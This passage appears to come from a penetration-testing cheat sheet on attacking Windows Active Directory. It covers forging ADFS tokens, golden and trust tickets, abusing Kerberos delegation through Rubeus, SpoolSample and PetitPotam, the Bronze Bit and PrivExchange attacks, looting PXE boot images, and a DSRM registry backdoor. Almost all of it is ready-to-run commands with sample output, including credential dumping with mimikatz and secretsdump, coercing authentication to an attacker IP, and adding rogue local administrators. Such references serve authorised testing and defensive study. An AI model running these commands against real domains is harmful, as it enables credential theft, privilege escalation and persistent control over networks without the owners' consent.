    pip install -r requirements.txt
    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
    ```

Other interesting tools to exploit AD FS: 
* [WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml)


## Active Directory Integrated DNS

ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.

* Enumerate all records using [dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
    ```ps1
    adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp (--dns-tcp)
    ```
* Query a node using [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
    ```ps1
    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController (--legacy)
    ```
* Add a node and attach a record
    ```ps1
    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
    ```

The common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network.

```ps1
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```


## Trust relationship between domains

* One-way
  * Domain B trusts A
  * Users in Domain A can access resources in Domain B
  * Users in Domain B cannot access resources in Domain A
* Two-way
  * Domain A trusts Domain B
  * Domain B trusts Domain A
  * Authentication requests can be passed between the two domains in both directions

### Enumerate trusts between domains

* Native `nltest`
  ```powershell
  nltest /trusted_domains
  ```
* PowerShell `GetAllTrustRelationships`
  ```powershell
  ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

  SourceName          TargetName                    TrustType      TrustDirection
  ----------          ----------                    ---------      --------------
  domainA.local      domainB.local                  TreeRoot       Bidirectional
  ```
* Crackmapexec module `enum_trusts`
  ```powershell
  cme ldap <ip> -u <user> -p <pass> -M enum_trusts 
  ```

### Exploit trusts between domains

:warning: Require a Domain-Admin level access to the current domain.

| Source     | Target  | Technique to use  | Trust relationship  |
|---|---|---|---|
| Root      | Child  | Golden Ticket + Enterprise Admin group (Mimikatz /groups) | Inter Realm (2-way)  |
| Child     | Child  | SID History exploitation (Mimikatz /sids)                 | Inter Realm Parent-Child (2-way)  |
| Child     | Root   | SID History exploitation (Mimikatz /sids)                 | Inter Realm Tree-Root (2-way)  |
| Forest A  | Forest B  | PrinterBug + Unconstrained delegation ?  | Inter Realm Forest or External (2-way)  |



## Child Domain to Forest Compromise - SID Hijacking

Most trees are linked with dual sided trust relationships to allow for sharing of resources.
By default the first domain created if the Forest Root.

**Requirements**: 
- KRBTGT Hash
- Find the SID of the domain
    ```powershell
    $ Convert-NameToSid target.domain.com\krbtgt
    S-1-5-21-2941561648-383941485-1389968811-502

    # with Impacket
    lookupsid.py domain/user:password@10.10.10.10
    ```
- Replace 502 with 519 to represent Enterprise Admins
- Create golden ticket and attack parent domain. 
    ```powershell
    kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
    ```

## Forest to Forest Compromise - Trust Ticket

* Require: SID filtering disabled

From the DC, dump the hash of the `currentdomain\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using 
Mimikatz, adding the SID for the target domain's enterprise admins group to our **SID history**.

### Dumping trust passwords (trust keys)

> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing **$** are computer accounts, but some are trust accounts.

```powershell
lsadump::trust /patch

or find the TRUST_NAME$ machine account hash
```

### Create a forged trust ticket (inter-realm TGT) using Mimikatz

```powershell
mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
```

### Use the Trust Ticket file to get a ST for the targeted service

```powershell
.\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

Inject the ST file and access the targeted service with the spoofed rights.

```powershell
kirbikator lsa .\ticket.kirbi
ls \\machine.domain.local\c$
```

## Privileged Access Management (PAM) Trust

> PAM (Privileged access managment) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon.

Requirements: 
* Windows Server 2016 or earlier   

If we compromise the bastion we get `Domain Admins` privileges on the other domain

* Default configuration for PAM Trust
    ```ps1
    # execute on our forest
    netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes 
    netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes 
    netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes 
    netdom trust lab.local /domain:bastion.local /Quarantine:No
    # execute on our bastion
    netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes
    ```
* Enumerate PAM trusts
    ```ps1
    # Detect if current forest is PAM trust
    Import ADModule
    Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

    # Enumerate shadow security principals 
    Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

    # Enumerate if current forest is managed by a bastion forest
    # Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External
    Get-ADTrust -Filter {(ForestTransitive -eq $True)} 
    ```
* Compromise
    * Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)
    * Using SID History
* Persistence
  ```ps1
  # Add a compromised user to the group 
  Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
  ```


## Kerberos Unconstrained Delegation

> The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 

> When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. 

:warning: Unconstrained delegation used to be the only option available in Windows 2000

> **Warning**
> Remember to coerce to a HOSTNAME if you want a Kerberos Ticket

### SpoolService Abuse with Unconstrained Delegation

The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.

**Requirements**:
- Object with Property **Trust this computer for delegation to any service (Kerberos only)**
- Must have **ADS_UF_TRUSTED_FOR_DELEGATION** 
- Must not have **ADS_UF_NOT_DELEGATED** flag
- User must not be in the **Protected Users** group 
- User must not have the flag **Account is sensitive and cannot be delegated**

#### Find delegation

:warning: : Domain controllers usually have unconstrained delegation enabled.    
Check the `TRUSTED_FOR_DELEGATION` property.

* [ADModule](https://github.com/samratashok/ADModule)
  ```powershell
  # From https://github.com/samratashok/ADModule
  PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
  ```

* [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
  ```powershell
  $> ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10   
  grep TRUSTED_FOR_DELEGATION domain_computers.grep
  ```

* [CrackMapExec module](https://github.com/mpgn/CrackMapExec/wiki) 
  ```powershell
  cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation
  ```

* BloodHound: `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
* Powershell Active Directory module: `Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl`

#### SpoolService status

Check if the spool service is running on the remote host

```powershell
ls \\dc01\pipe\spoolss
python rpcdump.py DOMAIN/user:password@10.10.10.10
```

#### Monitor with Rubeus

Monitor incoming connections from Rubeus.

```powershell
Rubeus.exe monitor /interval:1 
```

#### Force a connect back from the DC

Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.

>  SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.

```powershell
# From https://github.com/leechristensen/SpoolSample
.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
# DC01.HACKER.LAB is the domain controller we want to compromise
# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.

# From https://github.com/dirkjanm/krbrelayx
printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>

# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689
python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
```

If the attack worked you should get a TGT of the domain controller.

#### Load the ticket

Extract the base64 TGT from Rubeus output and load it to our current session.

```powershell
.\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
```

Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekurlsa::tickets`

Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`


#### Mitigation

* Ensure sensitive accounts cannot be delegated
* Disable the Print Spooler Service


### MS-EFSRPC Abuse with Unconstrained Delegation

Using `PetitPotam`, another tool to coerce a callback from the targeted machine, instead of `SpoolSample`.

```bash
# Coerce the callback
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP

# Extract the ticket
.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
```


## Kerberos Constrained Delegation

> Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.


### Identify a Constrained Delegation

* BloodHound: `MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p`
* PowerView: `Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft`
* Native
  ```powershell
  Get-DomainComputer -TrustedToAuth | select -exp dnshostname
  Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
  ```

### Exploit the Constrained Delegation

* Impacket
  ```ps1
  getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
  ```

* Rubeus: S4U2 attack (S4U2self + S4U2proxy)
  ```ps1
  # with a password
  Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"

  # with a NT hash
  Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
  Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
  dir \\dc.domain.com\c$
  ```

* Rubeus: use an existing ticket to perform a S4U2 attack to impersonate the "Administrator"
  ```ps1
  # Dump ticket
  Rubeus.exe tgtdeleg /nowrap
  Rubeus.exe triage
  Rubeus.exe dump /luid:0x12d1f7

  # Create a ticket
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
  ```

* Rubeus : using aes256 keys
  ```ps1
  # Get aes256 keys of the machine account
  privilege::debug
  token::elevate
  sekurlsa::ekeys

  # Create a ticket
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt
  ```


### Impersonate a domain user on a resource

Require:
* SYSTEM level privileges on a machine configured with constrained delegation

```ps1
PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
PS> $idToImpersonate.Impersonate()
PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
PS> ls \\dc01.offense.local\c$
```


## Kerberos Resource Based Constrained Delegation

Resource-based Constrained Delegation was introduced in Windows Server 2012. 

> The user sends a Service Ticket (ST) to access the service ("Service A"), and if the service is allowed to delegate to another pre-defined service ("Service B"), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html

1. Import **Powermad** and **Powerview**

    ```powershell
    PowerShell.exe -ExecutionPolicy Bypass
    Import-Module .\powermad.ps1
    Import-Module .\powerview.ps1
    ```

2. Get user SID

    ```powershell
    $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
    $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
    $ACE
    ConvertFrom-SID $ACE.SecurityIdentifier
    ```

3. Abuse **MachineAccountQuota** to create a computer account and set an SPN for it

    ```powershell
    New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)
    ```

4. Rewrite DC's **AllowedToActOnBehalfOfOtherIdentity** properties

    ```powershell
    $ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)
    Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
    $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
    $Descriptor.DiscretionaryAcl
    ```

    ```ps1
    # alternative
    $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

    # alternative
    StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND
    ```

5. Use Rubeus to get hash from password

    ```powershell
    Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan
    [*] Input password             : Weakest123*
    [*] Input username             : swktest$
    [*] Input domain               : factory.lan
    [*] Salt                       : FACTORY.LANswktest
    [*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD
    [*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498
    [*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347
    [*]       des_cbc_md5          : BA297CFD07E62A5E
    ```

6. Impersonate domain admin using our newly created machine account

    ```powershell
    .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
    .\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap

    [*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
    [*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
    [*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'
    [*] Sending S4U2proxy request
    [+] S4U2proxy success!
    [*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':

        doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD
        AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE
        LmZhY3RvcnkubGFu

    [*] Action: Import Ticket
    [+] Ticket successfully imported!
    ```

## Kerberos Service for User Extension

* Service For User To Self which allows a service to obtain a TGS on behalf of another user
* Service For User To Proxy which allows a service to obtain a TGS on behalf of another user on another service

### S4U2self - Privilege Escalation

1. Get a TGT 
    * Using Unconstrained Delegation
    * Using the current machine account: `Rubeus.exe tgtdeleg /nowrap`
2. Use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.
    ```ps1
    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
    Rubeus.exe ptt /ticket:"base64ticket"

    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
    ```

The "Network Service" account and the AppPool identities can act as the computer account in terms of Active Directory, they are only restrained locally. Therefore it is possible to invoke S4U2self if you run as one of these and request a service ticket for any user (e.g. someone with local admin rights, like DA) to yourself.

```ps1
# The Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed.
Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
# The service name is not included in the TGS ciphered data and can be modified at will.
Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
```


## Kerberos Bronze Bit Attack - CVE-2020-17049

> An attacker can impersonate users which are not allowed to be delegated. This includes members of the **Protected Users** group and any other users explicitly configured as **sensitive and cannot be delegated**.

> Patch is out on November 10, 2020, DC are most likely vulnerable until [February 2021](https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049).

:warning: Patched Error Message : `[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)`

Requirements:
* Service account's password hash 
* Service account's with `Constrained Delegation` or `Resource Based Constrained Delegation`
* [Impacket PR #1013](https://github.com/SecureAuthCorp/impacket/pull/1013) 

**Attack #1** - Bypass the `Trust this user for delegation to specified services only – Use Kerberos only` protection and impersonate a user who is protected from delegation.

```powershell
# forwardable flag is only protected by the ticket encryption which uses the service account's password 
$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller> # -> Forwardable

$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable

# Load the ticket
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit

# Access "c$"
ls \\service2.test.local\c$
```

**Attack #2** - Write Permissions to one or more objects in the AD

```powershell
# Create a new machine account
Import-Module .\Powermad\powermad.ps1
New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit

# Set PrincipalsAllowedToDelegateToAccount
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADComputer AttackerService
Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount

# Execute the attack
python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$

# Load the ticket
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
```

## PrivExchange attack

Exchange your privileges for Domain Admin privs by abusing Exchange.    
:warning: You need a shell on a user account with a mailbox.


1. Exchange server hostname or IP address

    ```bash 
    pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
    ```


2. Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).

    ```powershell
    ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
    ```


3. Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.

    ```bash
    # https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py
    python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
    python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange
    
    # https://github.com/G0ldenGunSec/PowerPriv 
    powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
    ```

4. Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash

    ```bash
    python secretsdump.py xxxxxxxxxx -just-dc
    python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
    ```

5. Clean your mess and restore a previous state of the user's ACL

    ```powershell
    python aclpwn.py --restore ../aclpwn-20190319-125741.restore
    ```

Alternatively you can use the Metasploit module 

[`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)

Alternatively you can use an all-in-one tool : Exchange2domain.

```powershell
git clone github.com/Ridter/Exchange2domain 
python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
```


## PXE Boot image attack

PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.

- Press **[F8]** during the PXE boot to spawn an administrator console on the deployed machine.
- Press **[SHIFT+F10]** during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.

    ```powershell
    net user hacker Password123! /add
    net localgroup administrators /add hacker
    ```

- Extract the pre-boot image (wim files) using [PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)](https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.

    ```powershell
    # Import the module
    PS > Import-Module .\PowerPXE.ps1

    # Start the exploit on the Ethernet interface
    PS > Get-PXEcreds -InterfaceAlias Ethernet
    PS > Get-PXECreds -InterfaceAlias « lab 0 » 

    # Wait for the DHCP to get an address
    >> Get a valid IP address
    >>> >>> DHCP proposal IP address: 192.168.22.101
    >>> >>> DHCP Validation: DHCPACK
    >>> >>> IP address configured: 192.168.22.101

    # Extract BCD path from the DHCP response
    >> Request BCD File path
    >>> >>> BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
    >>> >>> TFTP IP Address:  192.168.22.3

    # Download the BCD file and extract wim files
    >> Launch TFTP download
    >>>> Transfer succeeded.
    >> Parse the BCD file: conf.bcd
    >>>> Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
    >>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
    >> Launch TFTP download
    >>>> Transfer succeeded.

    # Parse wim files to find interesting data
    >> Open LiteTouchPE_x86.wim
    >>>> Finding Bootstrap.ini
    >>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
    >>>> >>>> UserID = MdtService
    >>>> >>>> UserPassword = Somepass1
    ```

## DNS Reconnaissance

Perform ADIDNS searches

```powershell
StandIn.exe --dns --limit 20
StandIn.exe --dns --filter SQL --limit 10
StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
```

## DSRM Credentials

> Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.

This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.

```ps1
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Check if the key exists and get the value
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 

# Create key with value "2" if it doesn't exist
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 

# Change value to "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```


## References

* [Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)
* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
* [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
* [Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)
* [BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 & @5ub34x](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/)
* [Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh](https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html)
* [BlueHat IL - Benjamin Delpy](https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf)
* [COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger ](https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE)
* [Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss](https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf)
* [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
* [Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin](https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/)
* [Dumping Domain Password Hashes - Pentestlab](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
* [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)
* [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
* [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
* [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
* [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
* [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
* [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
* [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
